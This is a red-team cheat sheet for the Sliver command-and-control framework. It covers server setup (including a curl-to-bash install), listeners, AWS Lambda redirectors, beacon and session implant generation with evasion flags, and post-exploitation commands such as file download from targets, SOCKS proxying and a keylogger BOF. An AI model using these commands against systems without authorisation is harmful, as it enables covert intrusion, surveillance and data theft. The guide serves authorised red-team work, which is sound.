# Sliver C2 Cheat Sheet

## Setup

Sliver client and server can both be downloaded from public [GitHub releases](https://github.com/BishopFox/sliver/releases/), or it can manually be compiled.

### Sliver Server 

The Sliver server can be installed running in "Daemon mode" using the [Linux Install Script](https://sliver.sh/docs?name=Linux+Install+Script). Use a quick Bash script below to help with setting up requirements and installing/running the Sliver server:
```
#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Not running as root"
    exit
fi

# Stop apache if its started automatically
service apache2 stop

cd /tmp
apt update -y
apt update --fix-missing -y
apt install git mingw-w64 net-tools -y

# Sliver install in Daemon mode
curl https://sliver.sh/install|sudo bash
systemctl status sliver --no-pager
echo Sliver running in Daemon mode!

# Create new user config
cd /root
IP=`curl https://ifconfig.me/ip`
./sliver-server operator --name sliver-user --lhost "$IP" --save /root/sliver-user.cfg
exit
```

The Sliver service can be verified that it's running with the command `systemctl status sliver`.<br />
Download the output config file `/root/sliver-user.cfg` from the above Bash script to import on your Sliver client.

If you want to automate Sliver C2 setup and deployment in DigitalOcean, check out my [GitHub repo](https://github.com/wsummerhill/Automation-Scripts/tree/main/Sliver-C2-deployment_DigitalOcean).

#### Manually creating or removing operators
Creating new operators:<br />
`./sliver-server operator --name summerhill --lhost X.X.X.X --save /root/user-summerhill.cfg`
<br /><br />
Sliver configs can be viewed or remove after importing them on your disk. Improrted configs get stored to the following locations:
- **Mac & Linux:** ~/.sliver-client/configs

#### Server Configurations
[Documentation link](https://sliver.sh/docs?name=Configuration+Files)<br />
The Sliver server config file can be viewed and modified (if needed) at the path `~/.sliver/configs/server.json`. The backend SQL database config for Sliver can be viewed at the path `~/.sliver/configs/database.json`. When Multiplayer mode is used, Sliver client configs get saved to the path `~/.sliver-client/configs/`.

### Sliver Client

Use the Sliver client to import your `sliver-user.cfg` config file and use it to connect to the Sliver server:
```
./sliver-client_OS import ./sliver-user.cfg    # Import config
./sliver-client_OS                             # Connect to Sliver server

Connecting to <IP ADDRESS>:31337 ...
[*] Loaded 69 extension(s) from disk

    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗
    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗
    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝
    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗
    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║
    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝

All hackers gain undying
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options

sliver > help
...
```
--------------------------------------------------------------
## Usage - Useful CLI Commands Cheat Sheet
```
# Starting HTTP/S Listeners
http # Start HTTP listener
https # Start HTTPS listener

# Managing or stopping listeners
jobs # View active jobs (aka listeners/stages)
jobs -k <number> # Kill listener job

# Beacon/Session management
beacons # List active beacons
sessions # List active sessions
beacons rm # Select a beacon to remove
use <ID> # Interact with a Beacon/Session
background # Background an active Beacon/Session

# Payloads
implants # List all created payload builds
implants rm <NAME> # Remove an implant build
generate -h ... # Create Session payload
generate beacon -h ... # Create Beacon payload

# Armory (BOFs)
armory # List all available packages/bundles in armory
armory search <query> # Search for specific aromory package/bundle
armory install <name> # Install a new armory package/bundle
armory update # Update installed packages

# Miscellaneous
hosts # List all hosts that have had beacons or sessions
update # Check for Sliver updates
clear # Clear the screen
loot # Show captured loot
reaction ... # Create automatic command upon specific events like a new session
```

--------------------------------------------------------------
## Listeners
### HTTP(S)
HTTP/S listeners can be creating using the `http` or `https` commands.
```
# Start HTTP listener accepting connections from specific domain (i.e. redirector)
http -d redirector-domain.com

# Start HTTPS listener using built-in letsencrypt features (not recommended for red teams)
https -d redirector-domain.com --lets-encrypt

# Start HTTPS listener using a cert/key which only accepts connections from a specific domain, persistent across restarts
https -c cert.pen -k key_decrypted.pem -d redirector-domain.com -p
```

### mTLS
Mutual TLS (mTLS) listeners can be created using the `mtls` command. mTLS uses public and private keys with TLS certificates to perform connectivity via TLS handsharkes. More info on mTLS can be found [here](https://www.cloudflare.com/learning/access-management/what-is-mutual-tls/).
```
# Start an mTLS listener accepting all connections
mtls


```

### Modifying Listeners
Listeners can be viewed with the `jobs` command. If you want to remove any listeners, you can use the command `jobs -k <ID>` to kill a job.

--------------------------------------------------------------
## Redirectors - HTTP(S)
### AWS Lambda HTTPS Redirector

One easy redirector to setup I frequently use is with AWS lambda from this [blog post here](https://thegreycorner.com/2023/08/30/aws-service-C2-forwarding.html#:~:text=as%20Code%20format.-,Function,-URL%20to%20Lambda) from The Grey Corner. Its easy to setup an AWS Lambda function pointing to your C2 server domain/IP address and use the function URL as your redirector URL when creating shellcode. Additionally, you could create an API Gateway to point to your Lambda function and then use the API Gateway as your redirector URL. 

Upon creation, your AWS Lambda function page should look something like this:
![image](https://github.com/wsummerhill/C2_RedTeam_CheatSheets/assets/35749735/9c2e1009-6546-4e53-aacf-fd6646b10945)

Within the Function permissions, the resource-based policy statement can be set to "FunctionURLAllowPublicAccess" to allow anonymous access to the Function.
![image](https://github.com/wsummerhill/C2_RedTeam_CheatSheets/assets/35749735/c86cd937-b6e2-41c2-af9d-fe4c7c0cd41c)

And the `lambda_function.py` code should look something like this, pointing to your C2 IP/domain:
![image](https://github.com/wsummerhill/C2_RedTeam_CheatSheets/assets/35749735/c349af74-bf40-4b32-a894-5d1089d06f54)


--------------------------------------------------------------
## Payloads
### Staged Payloads

Use my blog [HERE](https://wsummerhill.github.io/redteam/2023/07/25/Sliver-C2-Usage-for-Red-Teams.html#staged-payloads) for more details on staged payloads. 

### Beacon Payloads
Beacon payloads perform ascychronous communication with your C2 server where the beacon sleeps and checks in with the C2 server on specific or random intervals.<br />
```
# Create Windows Beacon HTTPS shellcode with evasion features
generate beacon --http https:/sliver-redirector.com --save /output/path/sliver-shellcode64.bin --seconds 60 --os windows --format shellcode --evasion

# Create Mac Beacon mTLS executable and skip all evasion features for testing purposes
generate beacon --http https:/sliver-redirector.com --save /output/path/sliver-shellcode64.bin --seconds 15 --os mac --skip-symbols --disable-sgn
```

### Session Payloads
Session payloads are different than Beacon payloads since they operate using interactive sessions and repeatedly callback to the C2 server every second (i.e. sleep time = 0). Session payloads also can't be converted after to Beacon payloads, so realistically they should only be using for debugging/testing or not at all.<br />
**Note: Sessions payloads are NOT recommended for red teams!**<br />
```
# Create Windows HTTPS session shellcode with evasion features
generate --http https:/sliver-redirector.com --save /output/path/sliver-shellcode64.bin --seconds 60 --os windows --format shellcode --evasion

# Create Linux mTLS session executable  
generate --mtls https:/sliver-redirector.com --save /output/path/ --os linux
```

### Debugging Payloads for testing

Sliver can easily create debugging payloads for testing execution or viewing C2 traffic sent by the payload or server. Use the `generate --debug` 
parameter when generating new payloads which will show the debug output in the CLI console. 

--------------------------------------------------------------
## Post-Exploitation (Built-in Commands)

Show active Beacons/Sessions with the `beacons` or `sessions` command. Next, interact with a Beacon/Session by typing `use <ID>`
```
info --> List info of current implant
getpid --> List current process PID
whoami --> List current user

# Execute commands on system
execute somecommand args1 args2

# Reconfiguring sleep/jitter time
reconfig -i 10s -j 25s

# Files
ls /home/kali --> LS, accepts wildcards
ls C:\\temp\\ --> LS, accepts wildcards
cat /path/to/read/file.txt --> Cat a file
mkdir C:\\temp\\payloads --> Make new directory

# Processes
ps --> List processes
ps -o admin --> Filter processes based on owner
ps -p <PID> --> Filter process based on PID

netstat --> List network connections
ifconfig --> List IP addresses

# Upload/download
upload C:\path\to\file.exe C:\\users\\admin\\downloads\\file.exe --> Upload file to target
download C:\\windows\\temp\\file.txt --> Download file to current local directory
download C:\\windows\\temp\\file.txt C:\path\to\save\file.txt --> Download file to specific local path
download C:\\users\admin\\downloads\\ -r --> Recursively download all files to current local directory

# SOCKS
socks5 start
socks5 stop

# View tasked commands
tasks
tasks fetch <ID> # fetch output from past task
```

--------------------------------------------------------------
## BOFs
### Sliver Armory

Pre-built library of BOFs that have been added to Sliver in the [official repository](https://github.com/sliverarmory) that can easily be loaded and run while interacting with Beacons/Sessions. The official Armory BOFs can be viewed on [GitHub here](https://github.com/sliverarmory).<br />
The Armory can be used to install individual BOFs or full packages of BOFs (i.e. TrustedSec Situational Awareness).<br />
```
# List available packages
armory

# Updating Armory
armory update

# Installations
armory install all --> Installing everything
armory install rubeus --> Install just Rubeus
armory install situational-awareness --> Install Situational Awareness package
armory search sa --> Search for Situational Awareness BOFs
```

### Custom BOFs

[Sliver Keylogger](https://github.com/trustedsec/SliverKeylogger)
Custom Sliver keylogger BOF from trustedsec. The BOF was later added to Sliver Armory in 2023 and can easily be loaded there using `armory install raw-keylogger`. Usage: <br />
```
raw_keylogger 1  # Start keylogger
raw_keylogger 2  # Get keylogged contents in Sliver
raw_keylogger 0  # Stop keylogger
```

--------------------------------------------------------------
## OPSEC Tips

- Best practices to modify the default HTTP(S) C2 profile at the local path `/root/.sliver/configs/http-c2.json`
    - [Sliver docs - Modifying C2 traffic](https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2#modifying-c2-traffic)
- Always use Sliver Armory wherever you can to execute commands within the current process instead of using commands or tools that spawn new or child processes.
